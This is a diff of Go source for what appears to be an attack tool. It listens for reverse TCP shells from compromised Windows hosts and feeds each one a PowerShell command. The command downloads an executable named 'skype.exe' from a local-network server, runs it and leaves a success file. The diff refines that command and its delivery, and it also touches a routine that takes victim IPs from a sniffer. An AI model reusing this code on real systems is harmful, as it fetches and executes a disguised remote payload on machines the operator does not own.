@@ -22,7 +22,7 @@ func CloseConnectionLoudly(conn net.Conn) {
 }
 
 func ListenAndHandleTCPShell(listener net.Listener, ip string, exploit_request_channel chan string){
-  command := "C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -C \"(new-object Net.WebClient).DownloadFile('http://192.168.1.51/skype.exe', 'C:\\skype.exe')\" && C:\\skype.exe && echo succ"
+  command := "C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -C \"(new-object Net.WebClient).DownloadFile('http://192.168.1.51/skype.exe', 'C:\\skype.exe')\" && start C:\\skype.exe && echo succ > C:\\succ.txt"
   fmt.Println("Listening for reverse TCP shell...")
   i := 0
   connchan := make(chan net.Conn)
@@ -53,17 +53,17 @@ func ListenAndHandleTCPShell(listener net.Listener, ip string, exploit_request_c
     fmt.Println("Error reading from reverse shell: " + readerr.Error())
   }
   fmt.Println("Shell acquired, launching command: " + command)
-  _, writeerr := writer.WriteString(command)
+  _, writeerr := writer.WriteString(command + "\r\n")
   if writeerr != nil {
     fmt.Println("Error writing to reverse shell: " + writeerr.Error())
   }
-  writer.WriteString("\r\n")
-  writer.Flush()
-
-  _, readerr = reader.ReadString('>')
-  if readerr != nil {
-    fmt.Println("Error reading from reverse shell: " + readerr.Error())
+  flusherr := writer.Flush()
+  if flusherr != nil {
+    fmt.Println("flush err: " + flusherr.Error())
   }
+
+  reader.ReadString('>')
+
   fmt.Println("Command launched")
 
   CloseConnectionLoudly(conn)
@@ -79,7 +79,7 @@ func ListenForSnifferData(ip_passing_channel chan string){
     ipreader := bufio.NewReader(conn)
     ip, readerr := ipreader.ReadString('\x00')
     ip = ip[:len(ip) - 1]
-    //ip, readerr := ipreader.ReadString('\n')
+
     if readerr != nil {
       fmt.Println("We gotta error reading from the sniffer: " + readerr.Error())
     }
